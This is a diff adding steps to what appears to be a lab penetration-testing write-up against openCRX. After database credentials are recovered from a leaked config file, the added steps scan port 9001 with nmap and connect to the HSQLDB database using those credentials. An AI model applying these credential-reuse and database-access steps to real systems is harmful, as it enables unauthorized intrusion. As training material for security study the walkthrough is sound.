@@ -280,3 +280,20 @@ We want to use this vulnerability to find files that can provide us with additio
 </org.opencrx.kernel.account1.Contact>
 ```
 A JDBC connection string in the file with a value of `"jdbc:hsqldb:hsql://127.0.0.1:9001/CRX"` lists a username of `"sa"` and a password of `"manager99"`. The application appears to be using HSQLDB, a Java database.
+
+let's do a quick `nmap` scan to find out if TCP port `9001` is open.
+```bash
+kali@kali:~/opencrx$ nmap -p 9001 opencrx
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-17 10:37 CST
+Nmap scan report for opencrx(192.168.121.126)
+Host is up (0.00047s latency).
+
+PORT     STATE SERVICE
+9001/tcp open  tor-orport
+
+Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
+```
+The database port appears to be open and we have credentials, so let's try connecting to the database and determine what we can do with it.
+```bash
+$ java -cp ~/hsqldb-2.7.4/hsqldb/lib/hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://opencrx:9001/CRX --user sa --password manager99
+```
